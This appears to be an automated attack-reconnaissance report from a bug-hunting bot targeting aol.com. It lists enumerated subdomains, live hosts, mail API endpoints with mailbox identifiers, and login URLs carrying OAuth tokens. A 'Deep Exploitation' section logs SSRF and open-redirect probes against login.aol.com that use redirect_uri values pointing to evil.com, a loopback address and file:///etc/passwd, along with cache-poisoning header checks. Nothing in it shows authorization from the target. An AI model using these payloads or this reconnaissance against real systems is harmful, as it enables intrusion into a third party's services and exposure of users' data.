# 🎯 aol — aol.com
**Date:** Sun May 10 21:56:11 UTC 2026 | **Runner:** GitHub Actions (free tier)

## Stats
| Metric | Count |
|--------|-------|
| Subdomains | 3000 |
| Live Hosts | 12 |
| URLs | 952 |
| Interesting Subs | 50 |
| IDOR Candidates | 0
0 |
| API Endpoints | 8 |
| JS Secrets | 0
0 |
| SSRF Candidates | 20 |
| Deep: SSRF Tests | 30 |
| Deep: Staging Hits | 0 |
| Deep: IDOR Suspects | 0 |
| Deep: Cache Checks | 5 |
| Deep: Origin Bypass | 0 |

## Interesting Subdomains (Shtylla 1: Hidden Targets)
```
*.admin.on.aol.com
*.alto-beta.mail.aol.com
*.api.hd.aol.com
*.api.hipster.aol.com
*.api.komentary.aol.com
*.api.on.aol.com
*.auth-saab.login.aol.com
*.console.on.aol.com
*.dev.comet.aol.com
*.imap.mail.aol.com
*.mail.aol.com
*.pr.login.aol.com
*.qa-caldav.aol.com
*.qa-carddav.aol.com
*.sandbox.aol.com
```

## Live Hosts
```
https://aol.com [301] [Yahoo]
https://corp.aol.com [301] [Yahoo]
https://caldav.aol.com [401]
https://carddav.aol.com [401] [Error 401 Unauthorized]
https://mail.aol.com [200] [AOL Mail]
https://204.web.aol.com [404] [Yahoo]
https://365.aol.com [404] [Yahoo]
https://ops.aol.com [404] [Yahoo]
https://11in2011.aol.com [404] [Yahoo]
https://search.aol.com [200] [AOL]
```

## IDOR Candidates
```

```

## API Endpoints
```
https://apis.mail.aol.com/ws/v3/mailboxes/@.id==VjN-Fytao0gQZcoC-9mGu_B7h2ZQ
https://apis.mail.aol.com/ws/v3/mailboxes/@.id==VjN-MWMjQcE-Lw7A8sXFeeyQbM7cIeoPzvvcS8UQO1FAkScVe4lwu4JdsURBmH2yZOX8Gl2LEeEb8L4Fd0GBJs5fOA/messages/@.id==AAFHr8XV5uTcKFc7TexL3ATivi2/content/parts/@.id in ['2
https://apis.mail.aol.com/ws/v3/mailboxes/@.id==VjN-pbcbDejx0XKRMQ6XDS0igo905P3enj8AsoQtZf3kflpiuevFayNSWlFggy81IVHcsdFKgbaBU0iQeGd8O0HeBA/messages/@.id==AAEbdZMCMUQEOBzR8aO6yarIapn/content/parts/@.id in ['2
https://consent.aol.com/v2/collectConsent?sessionId=1_cc-session_a9ae9a0d-b7d7-4b16-bfa6-3d4b9606d68b
https://consent.aol.com/v2/collectConsent?sessionId=3_cc-session_27e913d8-d7b8-49ea-834c-a8f9bf7612e1
https://consent.aol.com/v2/collectConsent?sessionId=3_cc-session_610fc6d5-c67d-4ad8-8e79-5b14d8896b27
https://consent.aol.com/v2/collectConsent?sessionId=3_cc-session_8ff6a589-309f-419a-85b7-95d946b398e1
https://mail.aol.com/psearch/v3/srp
```

## JS Secrets
```

```

## SSRF Candidates
```
https://login.aol.com/?src=calendar&client_id=mMbyBIZXcPgYwdAO&crumb=2y0rzUAbBbt&redirect_uri=https%3A%2F%2Foidc.calendar.aol.com%2Fcallback&pspid=1197803637&activity=default&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3DmMbyBIZXcPgYwdAO%26nonce%3DU2c25NrZdJZ2qXdDeZeKJe5PwB464y2u%26redirect_uri%3Dhttps%253A%252F%252Foidc.calendar.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dcalendar%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20ifQ.tI4Quuixnhn4GO1Zxihv5c-txspXB9lRJKAUN4CJlyaKxY4PZOnBFfFEo1RtNo1WaPh36WbhA5M8WQi0wr3nLOj4VDZZl8PhbZwvCDJFx1eWgh_SF9ZBze1Tn3gzjPbqEn3M6RugamiaDGbG0beXlYGDQEjfv4VjqFllytNqrWI
https://login.aol.com/?src=calendar&client_id=mMbyBIZXcPgYwdAO&crumb=IQeF1Am6OA1&redirect_uri=https%3A%2F%2Foidc.calendar.aol.com%2Fcallback&pspid=1197803637&activity=default&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3DmMbyBIZXcPgYwdAO%26nonce%3DQQtMCRuo18o0cp8kFxQCzMDJkyH1F1KJ%26redirect_uri%3Dhttps%253A%252F%252Foidc.calendar.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dcalendar%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20ifQ.tI4Quuixnhn4GO1Zxihv5c-txspXB9lRJKAUN4CJlyaKxY4PZOnBFfFEo1RtNo1WaPh36WbhA5M8WQi0wr3nLOj4VDZZl8PhbZwvCDJFx1eWgh_SF9ZBze1Tn3gzjPbqEn3M6RugamiaDGbG0beXlYGDQEjfv4VjqFllytNqrWI
https://login.aol.com/?src=calendar&client_id=mMbyBIZXcPgYwdAO&crumb=aEcFudI15QF&redirect_uri=https%3A%2F%2Foidc.calendar.aol.com%2Fcallback&pspid=1197803637&activity=default&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3DmMbyBIZXcPgYwdAO%26nonce%3DGuQw6Z9juJQyriCeF0oKimxtY6h0s9EM%26redirect_uri%3Dhttps%253A%252F%252Foidc.calendar.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dcalendar%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20ifQ.tI4Quuixnhn4GO1Zxihv5c-txspXB9lRJKAUN4CJlyaKxY4PZOnBFfFEo1RtNo1WaPh36WbhA5M8WQi0wr3nLOj4VDZZl8PhbZwvCDJFx1eWgh_SF9ZBze1Tn3gzjPbqEn3M6RugamiaDGbG0beXlYGDQEjfv4VjqFllytNqrWI
https://login.aol.com/?src=calendar&client_id=mMbyBIZXcPgYwdAO&crumb=ah5VjX03KI9&redirect_uri=https%3A%2F%2Foidc.calendar.aol.com%2Fcallback&pspid=1197803637&activity=default&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3DmMbyBIZXcPgYwdAO%26nonce%3Dml1wvZW3onR9Pd2mu2erM6pZCMfsFMh2%26redirect_uri%3Dhttps%253A%252F%252Foidc.calendar.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dcalendar%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20ifQ.tI4Quuixnhn4GO1Zxihv5c-txspXB9lRJKAUN4CJlyaKxY4PZOnBFfFEo1RtNo1WaPh36WbhA5M8WQi0wr3nLOj4VDZZl8PhbZwvCDJFx1eWgh_SF9ZBze1Tn3gzjPbqEn3M6RugamiaDGbG0beXlYGDQEjfv4VjqFllytNqrWI
https://login.aol.com/?src=mail&client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&crumb=7PZ.O7mz42A&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26nonce%3DwRtbQJbi56e3R16ZZFichfPWnrYaJ2ET%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dsdct-w%2Bmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bsdct-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tIn0.iQPlesFVqniUy0Jgv9B8D4zTxOfLgyB3NhbxqsEKf3lTZKYVJX1tDqq9x46W-YIublTZasOaHPKPDyusH6SlL0ilISnRlkqABXDF8DozaUYPaKijbMKe82v4H4ynYyOVayEBv9zUnF88SdRQtB0gyDz6N-5uYuwcZJy6HBMH-XU&pspid=1197803637&activity=default&redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback
https://login.aol.com/?src=mail&client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&crumb=8INmBikZPQI&redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback&pspid=1197803637&activity=default&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26nonce%3DmCCNMrhJxaFAhYCtksJUGtscJ77UEh1t%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dsdct-w%2Bmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bsdct-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tIn0.iQPlesFVqniUy0Jgv9B8D4zTxOfLgyB3NhbxqsEKf3lTZKYVJX1tDqq9x46W-YIublTZasOaHPKPDyusH6SlL0ilISnRlkqABXDF8DozaUYPaKijbMKe82v4H4ynYyOVayEBv9zUnF88SdRQtB0gyDz6N-5uYuwcZJy6HBMH-XU
https://login.aol.com/?src=mail&client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&crumb=8f32ZRwMk%2F7&redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback&pspid=1197803637&activity=default&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26nonce%3DAbF4sl8PacAoveW9Udts0o82GFKhl44W%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dsdct-w%2Bmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bsdct-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tIn0.iQPlesFVqniUy0Jgv9B8D4zTxOfLgyB3NhbxqsEKf3lTZKYVJX1tDqq9x46W-YIublTZasOaHPKPDyusH6SlL0ilISnRlkqABXDF8DozaUYPaKijbMKe82v4H4ynYyOVayEBv9zUnF88SdRQtB0gyDz6N-5uYuwcZJy6HBMH-XU
https://login.aol.com/?src=mail&client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&crumb=Am3hejlkiJ3&redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback&pspid=1197803637&activity=default&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26nonce%3Dj6i70W1az5vp3Cu0VcvxKbtoctQxzqZg%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dsdct-w%2Bmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bsdct-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tIn0.iQPlesFVqniUy0Jgv9B8D4zTxOfLgyB3NhbxqsEKf3lTZKYVJX1tDqq9x46W-YIublTZasOaHPKPDyusH6SlL0ilISnRlkqABXDF8DozaUYPaKijbMKe82v4H4ynYyOVayEBv9zUnF88SdRQtB0gyDz6N-5uYuwcZJy6HBMH-XU
https://login.aol.com/?src=mail&client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&crumb=SsgItE9SLsi&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26nonce%3DefsiWi57vEYG9w7bATs5nZbZZMshgYPi%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dsdct-w%2Bmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bsdct-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tIn0.iQPlesFVqniUy0Jgv9B8D4zTxOfLgyB3NhbxqsEKf3lTZKYVJX1tDqq9x46W-YIublTZasOaHPKPDyusH6SlL0ilISnRlkqABXDF8DozaUYPaKijbMKe82v4H4ynYyOVayEBv9zUnF88SdRQtB0gyDz6N-5uYuwcZJy6HBMH-XU&pspid=1197803637&activity=default&redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback
https://login.aol.com/?src=mail&client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&crumb=TgMuGlIesqv&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Factivity%3Dmail-direct%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26language%3Den-US%26nonce%3DFHZPEPhdlpZNaf4zFJyJz4HCZgCv4A3V%26pspid%3D972825001%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dsdct-w%2Bmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bsdct-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL2QvIn0.oLAnPHksIrKAcI7p8n156u-Jwzgh_FvU63jt38M7JqfpEc0S8FfA5wh6EDoSzv9XwZu8V6UHBP1_zx6sNJFx6y2cxxd8I0Y-DG7Pj3FRNrpQrds3DFTgDOCt2_chquXlJrkbc-lMHdyeKIujEQJHmwRGpM3v4VGO2jPCqlzSHsQ&lang=en-US&pspid=972825001&activity=mail-direct&redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback
```

## Nuclei
```

```

## 🔥 Deep Exploitation (Verified)

### SSRF Validation
```
[ext:429] https://login.aol.com/?redirect_uri=http://evil.com
[int:429] https://login.aol.com/?redirect_uri=http://127.0.0.1:8080/
[file:429] https://login.aol.com/?redirect_uri=file:///etc/passwd
[ext:429] https://login.aol.com/?redirect_uri=http://evil.com
[int:429] https://login.aol.com/?redirect_uri=http://127.0.0.1:8080/
[file:429] https://login.aol.com/?redirect_uri=file:///etc/passwd
[ext:429] https://login.aol.com/?redirect_uri=http://evil.com
[int:429] https://login.aol.com/?redirect_uri=http://127.0.0.1:8080/
[file:429] https://login.aol.com/?redirect_uri=file:///etc/passwd
[ext:429] https://login.aol.com/?redirect_uri=http://evil.com
[int:429] https://login.aol.com/?redirect_uri=http://127.0.0.1:8080/
[file:429] https://login.aol.com/?redirect_uri=file:///etc/passwd
[ext:429] https://login.aol.com/?redirect_uri=http://evil.com
[int:429] https://login.aol.com/?redirect_uri=http://127.0.0.1:8080/
[file:429] https://login.aol.com/?redirect_uri=file:///etc/passwd
```

### Staging/Dev Accessible
```

```

### IDOR Verified
```

```

### Cache Poisoning
```
XFH-Scheme: https://aol.com [301]
XFH-Scheme: https://corp.aol.com [404]
XFH-Scheme: https://caldav.aol.com [401]
XFH-Scheme: https://carddav.aol.com [401]
XFH-Scheme: https://mail.aol.com [200]
```

### CDN Bypass / Origin Discovery
```

```

---
🤖 SUPER-ARSENAL Hunter on GitHub Actions (free tier — unlimited minutes)
